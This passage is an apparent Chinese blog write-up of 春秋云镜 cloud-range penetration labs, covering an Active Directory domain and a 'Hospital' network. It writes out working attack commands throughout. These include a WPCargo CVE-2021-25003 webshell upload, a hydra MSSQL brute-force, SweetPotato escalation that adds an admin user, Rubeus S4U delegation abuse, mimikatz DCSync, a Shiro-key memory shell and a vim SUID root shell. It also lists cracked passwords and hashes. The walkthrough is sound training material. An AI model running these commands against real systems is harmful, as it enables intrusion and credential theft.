Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.34:139 =&gt; Banner:[.][2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:1433 =&gt; [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.][2025-04-15 15:24:05] [SUCCESS] 服务识别 172.22.2.18:139 =&gt; [2025-04-15 15:24:05] [SUCCESS] 服务识别 172.22.2.18:445 =&gt; [2025-04-15 15:24:05] [SUCCESS] 服务识别 172.22.2.7:6379 =&gt; [2025-04-15 15:24:10] [SUCCESS] 服务识别 172.22.2.34:135 =&gt; [2025-04-15 15:24:10] [SUCCESS] 服务识别 172.22.2.16:135 =&gt; [2025-04-15 15:24:10] [SUCCESS] 服务识别 172.22.2.3:135 =&gt; [2025-04-15 15:24:10] [INFO] 存活端口数量: 21[2025-04-15 15:24:10] [INFO] 开始漏洞扫描[2025-04-15 15:24:10] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle[2025-04-15 15:24:10] [SUCCESS] NetInfo 扫描结果目标主机: 172.22.2.34主机名: CLIENT01发现的网络接口: IPv4地址: └─ 172.22.2.34[2025-04-15 15:24:10] [SUCCESS] NetInfo 扫描结果目标主机: 172.22.2.3主机名: DC发现的网络接口: IPv4地址: └─ 172.22.2.3[2025-04-15 15:24:10] [SUCCESS] NetInfo 扫描结果目标主机: 172.22.2.16主机名: MSSQLSERVER发现的网络接口: IPv4地址: └─ 172.22.2.16[2025-04-15 15:24:10] [INFO] 系统信息 172.22.2.3 [Windows Server 2016 Datacenter 14393][2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.34 XIAORANG\\CLIENT01 [2025-04-15 15:24:10] [SUCCESS] 网站标题 http://172.22.2.16 状态码:404 长度:315 标题:Not Found[2025-04-15 15:24:10] [SUCCESS] 网站标题 http://172.22.2.7 状态码:200 长度:4833 标题:Welcome to CentOS[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.3 DC:DC.xiaorang.lab Windows Server 2016 Datacenter 14393[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.16 MSSQLSERVER.xiaorang.lab Windows Server 2016 Datacenter 14393[2025-04-15 15:24:10] [INFO] 系统信息 172.22.2.16 [Windows Server 2016 Datacenter 14393][2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.18 WORKGROUP\\UBUNTU-WEB02 [2025-04-15 15:24:10] [SUCCESS] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable[2025-04-15 15:24:10] [SUCCESS] 匿名登录成功![2025-04-15 15:24:10] [SUCCESS] SMB认证成功 172.22.2.18:445 administrator:123456[2025-04-15 15:24:10] [INFO] SMB2共享信息 172.22.2.18:445 administrator Pass:123456 共享:[print$ IPC$][2025-04-15 15:24:10] [SUCCESS] 网站标题 http://172.22.2.18 状态码:200 长度:57738 标题:又一个WordPress站点[2025-04-15 15:24:12] [INFO] SMB2共享信息 172.22.2.16:445 admin Pass:123456 共享:[ADMIN$ C$ fileshare IPC$][2025-04-15 15:24:18] [SUCCESS] SMB认证成功 172.22.2.16:445 admin:123456 扫到一堆哦一个一个看，172.22.2.18的80端口是一个wps，用wpscan扫一下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556[i] Plugin(s) Identified:[+] wpcargo | Location: http://172.22.2.18/wp-content/plugins/wpcargo/ | Last Updated: 2024-08-08T17:00:00.000Z | [!] The version is out of date, the latest version is 7.0.6 | | Found By: Urls In Homepage (Passive Detection) | | [!] 6 vulnerabilities identified: | | [!] toc: truetitle: WPCargo &lt; 6.9.0 - Unauthenticated RCE | Fixed in: 6.9.0 | References: | - https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25003 | | [!] toc: truetitle: WPCargo Track &amp; Trace &lt; 6.9.5 - Reflected Cross Site Scripting | Fixed in: 6.9.5 | References: | - https://wpscan.com/vulnerability/d5c6f894-6ad1-46f4-bd77-17ad9234cfc3 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1436 | | [!] toc: truetitle: WPCargo Track &amp; Trace &lt; 6.9.5 - Admin+ Stored Cross Site Scripting | Fixed in: 6.9.5 | References: | - https://wpscan.com/vulnerability/ef5aa8a7-23a7-4ce0-bb09-d9c986386114 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1435 | | [!] toc: truetitle: WPCargo Track &amp; Trace &lt;= 7.0.6 - Unauthenticated SQL Injection | References: | - https://wpscan.com/vulnerability/f5fdb762-cbc1-4352-9ab2-cbba9d3d33e2 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-44004 | - https://www.wordfence.com/threat-intel/vulnerabilities/id/0e725ec0-4897-4ba7-a803-80e8aafacbd1 | | [!] toc: truetitle: WPCargo Track &amp; Trace &lt;= 7.0.6 - Missing authorization to Authenticated (Subscriber+) Settings Update | References: | - https://wpscan.com/vulnerability/b433fff9-b501-4fb3-9f04-5e18b64b0a90 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-54271 | - https://www.wordfence.com/threat-intel/vulnerabilities/id/0c467a78-1ba4-4c0d-84e6-db54fc1b0c63 | | [!] toc: truetitle: WPCargo Track &amp; Trace &lt;= 7.0.6 - Authenticated (Contributor+) Insecure Direct Object Reference | References: | - https://wpscan.com/vulnerability/594ae221-06b6-4bc2-b5b6-0f9bac880f7b | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-31609 | - https://www.wordfence.com/threat-intel/vulnerabilities/id/887ecedb-0bc8-4488-b6fa-27cfa22345e6 | | Version: 6.x.x (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt 存在wpcargo插件，有一个rce的漏洞https://github.com/biulove0x/CVE-2021-25003 123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# python3 2 -t &quot;http://172.22.2.18/&quot;[proxychains] DLL init: proxychains-ng 4.17############################################# @author : biulove0x ## @name : WP Plugins WPCargo Exploiter ## @cve : CVE-2021-25003 #############################################[proxychains] Strict chain ... 192.168.11.1:9999 ... 172.22.2.18:80 ... OK[-] http://172.22.2.18/wp-content/wp-conf.php =&gt; Uploaded! 蚁剑连接，可以拿到数据库的密码 flag2在数据库里 FLAG3在另一张表里有很多密码 是172.22.2.16 msssql数据库的密码本，然后动手爆破，mssql的默认用户名是sa，因为导出来的有空格，所以把前面的空格处理掉 1└─# grep -P &quot;\\w+&quot; pass -o &gt;2 12└─# hydra -l sa -P pass 172.22.2.16 mssql -f -I -vV[1433][mssql] host: 172.22.2.16 login: sa password: ElGNkOiC 然后用MDUT连接 上传sweetpotato.exe然后提权 flag03在C:\\Users\\Administrator\\flag\\下 1C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a &quot;type C:\\Users\\Administrator\\flag\\flag03.txt&quot; FLAG4netstat -ano发现开启了3389 123456789101112TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 692 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:1433 0.0.0.0:0 LISTENING 2680 TCP 0.0.0.0:2383 0.0.0.0:0 LISTENING 2932 TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING 812 添加一个用户 12C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a &quot;net user lv Asd123123 /add&quot;C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a &quot;net localgroup administrators lv /add&quot; 然后远程桌面登录 可以发现有域环境，先上传mimikatz提取hash，上传bloodhound可以发现有约束性委派 获取到域用户的哈希为cea3e66a2715c71423e7d3f0ff6cd352 通过Rubeus申请机器账户MSSQLSERVER的TGT，执行后，将得到 Base64 加密后的 TGT 票据 1Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:cea3e66a2715c71423e7d3f0ff6cd352 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap 然后使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中 1Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:[base64(ticket.kirbi)] LDAP服务具有DCSync权限，可以导出域内用户哈希 1mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot; exit 得到域管的哈希为1a19251fbd935969832616366ae3fe62 然后就可以用WMI服务登录域控，flag在C:\\Users\\Administrator\\flag下","categories":[{"name":"春秋云镜","slug":"春秋云镜","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"春秋云镜-Hospital","slug":"春秋云镜-Hospital","date":"2025-04-10T08:46:51.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2025/04/10/春秋云镜-Hospital/","permalink":"https://lvzhouhang.xyz/2025/04/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital/","excerpt":"","text":"flag01首先扫描一下端口，有一个22端口和8080端口，然后用fscan对这两个端口进行扫描，可以扫到一个heapdump泄露 1234567891011121314151617181920┌──(root㉿kali)-[~/Desktop/tmp]└─# ../pentest/fscan/fscan -h 39.99.232.64 -p 8080 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt;\\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4start infoscan39.99.232.64:8080 open[*] alive ports len is: 1start vulscan[*] WebTitle http://39.99.232.64:8080 code:302 len:0 toc: truetitle:None 跳转url: http://39.99.232.64:8080/login;jsessionid=AABFA3A139D86181B9A09BD41BE26BAD[*] WebTitle http://39.99.232.64:8080/login;jsessionid=AABFA3A139D86181B9A09BD41BE26BAD code:200 len:2005 toc: truetitle:医疗管理后台[+] PocScan http://39.99.232.64:8080 poc-yaml-spring-actuator-heapdump-file已完成 1/1[*] 扫描结束,耗时: 6.890674118s 访问/actuator/heapdump，奖heapdump下载下了，然后用JDumpSpider分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237E:\\CTF\\heapdump via ☕ v17.0.11❯ java -jar .\\JDumpSpider-1.1-SNAPSHOT-full.jar .\\heapdump===========================================SpringDataSourceProperties-------------not found!===========================================WeblogicDataSourceConnectionPoolConfig-------------not found!===========================================MongoClient-------------not found!===========================================AliDruidDataSourceWrapper-------------not found!===========================================HikariDataSource-------------not found!===========================================RedisStandaloneConfiguration-------------not found!===========================================JedisClient-------------not found!===========================================CookieRememberMeManager(ShiroKey)-------------algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES===========================================OriginTrackedMapPropertySource-------------management.endpoints.web.exposure.include = *server.port = 8080spring.thymeleaf.prefix = classpath:/templates/===========================================MutablePropertySources-------------awt.toolkit = sun.awt.X11.XToolkitsun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classesjava.protocol.handler.pkgs = org.springframework.boot.loadersun.management.compiler = HotSpot 64-Bit Tiered Compilerssun.cpu.isalist =sun.jnu.encoding = UTF-8java.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08java.class.path = /app/login-1.0-SNAPSHOT.jarpath.separator = :java.vm.vendor = Private Buildos.version = 5.4.0-164-genericjava.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsedjava.runtime.name = OpenJDK Runtime Environmentfile.encoding = UTF-8catalina.useNaming = falsespring.beaninfo.ignore = truejava.vm.specification.version = 1.8os.name = Linuxjava.vm.name = OpenJDK 64-Bit Server VMlocal.server.port = nulluser.country = USjava.vendor.url.bug = http://bugreport.sun.com/bugreport/sun.java.command = /app/login-1.0-SNAPSHOT.jarjava.io.tmpdir = /tmpcatalina.home = /tmp/tomcat.5978727065775558529.8080java.version = 1.8.0_392user.home = /home/appuser.language = enPID = 750java.awt.printerjob = sun.print.PSPrinterJobfile.separator = /catalina.base = /tmp/tomcat.5978727065775558529.8080java.vm.info = mixed modejava.specification.name = Java Platform API Specificationjava.vm.specification.vendor = Oracle Corporationjava.awt.graphicsenv = sun.awt.X11GraphicsEnvironmentjava.awt.headless = truesun.io.unicode.encoding = UnicodeLittlejava.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext===========================================MapPropertySources-------------local.server.port = null===========================================ConsulPropertySources-------------not found!===========================================JavaProperties-------------java.util.logging.FileHandler.pattern = %h/java%u.logawt.toolkit = sun.awt.X11.XToolkitsun.cpu.isalist =sun.jnu.encoding = UTF-8sun.arch.data.model = 64catalina.useNaming = falsesecurity.overridePropertiesFile = truesun.boot.library.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64security.provider.7 = com.sun.security.sasl.Providersun.java.command = /app/login-1.0-SNAPSHOT.jarsecurity.provider.9 = sun.security.smartcardio.SunPCSCjava.specification.vendor = Oracle Corporationsecurity.provider.1 = sun.security.provider.Sunsecurity.provider.2 = sun.security.rsa.SunRsaSignsecurity.provider.3 = sun.security.ec.SunECnetworkaddress.cache.negative.ttl = 10security.provider.4 = com.sun.net.ssl.internal.ssl.Providersecurity.provider.5 = com.sun.crypto.provider.SunJCEsecurity.provider.6 = sun.security.jgss.SunProviderfile.separator = /org.springframework.web.servlet.HandlerExceptionResolver = org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver,org.springframework.web.servlet.mvc.annotation.ResponseStatusExceptionResolver,org.springframework.web.servlet.mvc.support.DefaultHandlerExceptionResolverjava.specification.name = Java Platform API Specificationjava.vm.specification.vendor = Oracle Corporationorg.springframework.web.servlet.HandlerMapping = org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping,org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping,org.springframework.web.servlet.function.support.RouterFunctionMappingorg.springframework.web.servlet.HandlerAdapter = org.springframework.web.servlet.mvc.HttpRequestHandlerAdapter,org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter,org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter,org.springframework.web.servlet.function.support.HandlerFunctionAdapterorg.springframework.web.servlet.FlashMapManager = org.springframework.web.servlet.support.SessionFlashMapManagerpackage.definition = sun.,com.sun.xml.internal.,com.sun.imageio.,com.sun.istack.internal.,com.sun.jmx.,com.sun.media.sound.,com.sun.naming.internal.,com.sun.proxy.,com.sun.corba.se.,com.sun.org.apache.bcel.internal.,com.sun.org.apache.regexp.internal.,com.sun.org.apache.xerces.internal.,com.sun.org.apache.xpath.internal.,com.sun.org.apache.xalan.internal.extensions.,com.sun.org.apache.xalan.internal.lib.,com.sun.org.apache.xalan.internal.res.,com.sun.org.apache.xalan.internal.templates.,com.sun.org.apache.xalan.internal.utils.,com.sun.org.apache.xalan.internal.xslt.,com.sun.org.apache.xalan.internal.xsltc.cmdline.,com.sun.org.apache.xalan.internal.xsltc.compiler.,com.sun.org.apache.xalan.internal.xsltc.trax.,com.sun.org.apache.xalan.internal.xsltc.util.,com.sun.org.apache.xml.internal.res.,com.sun.org.apache.xml.internal.resolver.helpers.,com.sun.org.apache.xml.internal.resolver.readers.,com.sun.org.apache.xml.internal.security.,com.sun.org.apache.xml.internal.serializer.utils.,com.sun.org.apache.xml.internal.utils.,com.sun.org.glassfish.,com.oracle.xmlns.internal.,com.oracle.webservices.internal.,oracle.jrockit.jfr.,org.jcp.xml.dsig.internal.,jdk.internal.,jdk.nashorn.internal.,jdk.nashorn.tools.,jdk.xml.internal.,com.sun.activation.registries.,jdk.jfr.events.,jdk.jfr.internal.,jdk.management.jfr.internal.sun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classesjava.protocol.handler.pkgs = org.springframework.boot.loadersun.management.compiler = HotSpot 64-Bit Tiered Compilersorg.springframework.web.servlet.ThemeResolver = org.springframework.web.servlet.theme.FixedThemeResolverjava.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08user.name = apppolicy.url.1 = file:$&#123;java.home&#125;/lib/security/java.policysecurerandom.source = file:/dev/randompolicy.url.2 = file:$&#123;user.home&#125;/.java.policyjdk.tls.disabledAlgorithms = SSLv3, TLSv1, TLSv1.1, RC4, DES, MD5withRSA, DH keySize &lt; 1024, EC keySize &lt; 224, 3DES_EDE_CBC, anon, NULL, include jdk.disabled.namedCurvespolicy.ignoreIdentityScope = falsefile.encoding = UTF-8java.util.logging.ConsoleHandler.formatter = java.util.logging.SimpleFormatterjdk.sasl.disabledMechanisms =java.io.tmpdir = /tmporg.springframework.web.servlet.ViewResolver = org.springframework.web.servlet.view.InternalResourceViewResolverjava.version = 1.8.0_392java.vm.specification.name = Java Virtual Machine Specificationjdk.tls.keyLimits = AES/GCM/NoPadding KeyUpdate 2^37PID = 750java.awt.printerjob = sun.print.PSPrinterJobjdk.xml.dsig.secureValidationPolicy = disallowAlg http://www.w3.org/TR/1999/REC-xslt-19991116,disallowAlg http://www.w3.org/2001/04/xmldsig-more#rsa-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#hmac-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#md5,maxTransforms 5,maxReferences 30,disallowReferenceUriSchemes file http https,minKeySize RSA 1024,minKeySize DSA 1024,minKeySize EC 224,noDuplicateIds,noRetrievalMethodLoopsjava.library.path = /usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/libjava.vendor = Private Buildjava.specification.maintenance.version = 5handlers = java.util.logging.ConsoleHandlersun.io.unicode.encoding = UnicodeLittlekrb5.kdc.bad.policy = tryLastjava.class.path = /app/login-1.0-SNAPSHOT.jarjava.vm.vendor = Private Buildjdk.security.legacyAlgorithms = SHA1, RSA keySize &lt; 2048, DSA keySize &lt; 2048jdk.disabled.namedCurves = secp112r1, secp112r2, secp128r1, secp128r2, secp160k1, secp160r1, secp160r2, secp192k1, secp192r1, secp224k1, secp224r1, secp256k1, sect113r1, sect113r2, sect131r1, sect131r2, sect163k1, sect163r1, sect163r2, sect193r1, sect193r2, sect233k1, sect233r1, sect239k1, sect283k1, sect283r1, sect409k1, sect409r1, sect571k1, sect571r1, X9.62 c2tnb191v1, X9.62 c2tnb191v2, X9.62 c2tnb191v3, X9.62 c2tnb239v1, X9.62 c2tnb239v2, X9.62 c2tnb239v3, X9.62 c2tnb359v1, X9.62 c2tnb431r1, X9.62 prime192v2, X9.62 prime192v3, X9.62 prime239v1, X9.62 prime239v2, X9.62 prime239v3, brainpoolP256r1, brainpoolP320r1, brainpoolP384r1, brainpoolP512r1crypto.policy = unlimitedjceks.key.serialFilter = java.lang.Enum;java.security.KeyRep;java.security.KeyRep$Type;javax.crypto.spec.SecretKeySpec;!*login.configuration.provider = sun.security.provider.ConfigFileuser.timezone =java.vm.specification.version = 1.8os.name = Linuxuser.country = USjdk.security.caDistrustPolicies = SYMANTEC_TLSsun.cpu.endian = littleuser.home = /home/appuser.language = enen = UTF-8jdk.tls.alpnCharset = ISO_8859_1ssl.KeyManagerFactory.algorithm = SunX509.level = INFOjava.awt.graphicsenv = sun.awt.X11GraphicsEnvironmentjava.awt.headless = truecom.xyz.foo.level = SEVEREpolicy.provider = sun.security.provider.PolicyFilepath.separator = :fr = UTF-8os.version = 5.4.0-164-genericjava.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsedjava.runtime.name = OpenJDK Runtime Environmentkeystore.type.compat = trueorg.springframework.web.servlet.RequestToViewNameTranslator = org.springframework.web.servlet.view.DefaultRequestToViewNameTranslatorspring.beaninfo.ignore = truejava.vm.name = OpenJDK 64-Bit Server VMjava.vendor.url.bug = http://bugreport.sun.com/bugreport/java.util.logging.FileHandler.formatter = java.util.logging.XMLFormatterjava.util.logging.FileHandler.count = 1catalina.home = /tmp/tomcat.5978727065775558529.8080sun.cds.enableSharedLookupCache = falsesun.security.krb5.maxReferrals = 5catalina.base = /tmp/tomcat.5978727065775558529.8080java.util.logging.FileHandler.limit = 50000java.vm.info = mixed modekeystore.type = jksjava.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/extpolicy.expandProperties = truesecurerandom.strongAlgorithms = NativePRNGBlocking:SUN===========================================ProcessEnvironment-------------not found!===========================================OSS-------------not found!===========================================UserPassSearcher-------------org.apache.shiro.web.filter.authc.FormAuthenticationFilter:[failureKeyAttribute = shiroLoginFailure, loginUrl = /login, successUrl = /, usernameParam = username, passwordParam = password]org.apache.catalina.startup.Tomcat:[hostname = localhost]===========================================CookieThief-------------not found!===========================================AuthThief-------------not found!=========================================== 有一个shirokey 1algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES 用shiro工具注入内存马,冰蝎连接即可 vim.basic存在suid权限 1234567891011121314151617181920app@web01:~$ find / -perm -u=s -type f 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/null/usr/bin/vim.basic/usr/bin/su/usr/bin/newgrp/usr/bin/staprun/usr/bin/at/usr/bin/passwd/usr/bin/gpasswd/usr/bin/umount/usr/bin/chfn/usr/bin/stapbpf/usr/bin/sudo/usr/bin/chsh/usr/bin/fusermount/usr/bin/mount/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device 系统存在python3环境， 参考https://gtfobins.github.io/gtfobins/vim/ 提权，flag01在/root/flag下 1/usr/bin/vim.basic -c &#x27;:python3 import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&#x27; flag02然后搭建一个代理隧道，上传一个fscan开始扫描 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586ip a 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e:0d:aa:83 brd ff:ff:ff:ff:ff:ff inet 172.30.12.5/16 brd 172.30.255.255 scope global dynamic eth0 valid_lft 315357949sec preferred_lft 315357949sec inet6 fe80::216:3eff:fe0d:aa83/64 scope link valid_lft forever preferred_lft forever ./fscan -h 172.30.12.1/24┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.0[2025-04-10 17:23:09] [INFO] 暴力破解线程数: 1[2025-04-10 17:23:09] [INFO] 开始信息扫描[2025-04-10 17:23:09] [INFO] CIDR范围: 172.30.12.0-172.30.12.255[2025-04-10 17:23:10] [INFO] 生成IP范围: 172.30.12.0.%!d(string=172.30.12.255) - %!s(MISSING).%!d(MISSING)[2025-04-10 17:23:10] [INFO] 解析CIDR 172.30.12.1/24 -&gt; IP范围 172.30.12.0-172.30.12.255[2025-04-10 17:23:10] [INFO] 最终有效主机数量: 256[2025-04-10 17:23:10] [INFO] 开始主机扫描[2025-04-10 17:23:10] [SUCCESS] 目标 172.30.12.5 存活 (ICMP)[2025-04-10 17:23:10] [SUCCESS] 目标 172.30.12.6 存活 (ICMP)[2025-04-10 17:23:10] [SUCCESS] 目标 172.30.12.236 存活 (ICMP)[2025-04-10 17:23:13] [INFO] 存活主机数量: 3[2025-04-10 17:23:13] [INFO] 有效端口数量: 233[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.236:22[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:445[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:139[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:135[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.5:22[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.236:8009[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.5:8080[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.236:8080[2025-04-10 17:23:13] [SUCCESS] 服务识别 172.30.12.236:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.][2025-04-10 17:23:13] [SUCCESS] 服务识别 172.30.12.5:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.][2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:8848[2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.6:445 =&gt; [2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.6:139 =&gt; Banner:[.][2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.236:8009 =&gt; [2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.5:8080 =&gt; [http][2025-04-10 17:23:19] [SUCCESS] 服务识别 172.30.12.236:8080 =&gt; [http][2025-04-10 17:23:24] [SUCCESS] 服务识别 172.30.12.6:8848 =&gt; [http][2025-04-10 17:24:18] [SUCCESS] 服务识别 172.30.12.6:135 =&gt; [2025-04-10 17:24:18] [INFO] 存活端口数量: 9[2025-04-10 17:24:18] [INFO] 开始漏洞扫描[2025-04-10 17:24:18] [INFO] 加载的插件: findnet, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle[2025-04-10 17:24:18] [SUCCESS] NetBios 172.30.12.6 WORKGROUP\\SERVER02 [2025-04-10 17:24:18] [SUCCESS] NetInfo 扫描结果目标主机: 172.30.12.6主机名: Server02发现的网络接口: IPv4地址: └─ 172.30.12.6[2025-04-10 17:24:18] [SUCCESS] 网站标题 http://172.30.12.5:8080 状态码:302 长度:0 标题:无标题 重定向地址: http://172.30.12.5:8080/login;jsessionid=BD7C602596372F417AEEB44C6651A392[2025-04-10 17:24:18] [SUCCESS] 网站标题 http://172.30.12.236:8080 状态码:200 长度:3964 标题:医院后台管理平台[2025-04-10 17:24:19] [SUCCESS] 网站标题 http://172.30.12.5:8080/login;jsessionid=BD7C602596372F417AEEB44C6651A392 状态码:200 长度:2005 标题:医疗管理后台[2025-04-10 17:24:19] [SUCCESS] 网站标题 http://172.30.12.6:8848 状态码:404 长度:431 标题:HTTP Status 404 – Not Found[2025-04-10 17:24:20] [SUCCESS] 目标: http://172.30.12.5:8080 漏洞类型: poc-yaml-spring-actuator-heapdump-file 漏洞名称: 详细信息: author:AgeloVito links:https://www.cnblogs.com/wyb628/p/8567610.html[2025-04-10 17:24:20] [SUCCESS] 目标: http://172.30.12.6:8848 漏洞类型: poc-yaml-alibaba-nacos 漏洞名称: 详细信息: author:AgeloVito links:https://blog.csdn.net/caiqiiqi/article/details/112005424[2025-04-10 17:24:21] [SUCCESS] 目标: http://172.30.12.6:8848 漏洞类型: poc-yaml-alibaba-nacos-v1-auth-bypass 漏洞名称: 详细信息: author:kmahyyg(https://github.com/kmahyyg) links:https://github.com/alibaba/nacos/issues/4593 扫到了一个nacos，那就从这里入手，弱口令nacos/nacos登录,这个框架还存在yaml反序列化漏洞 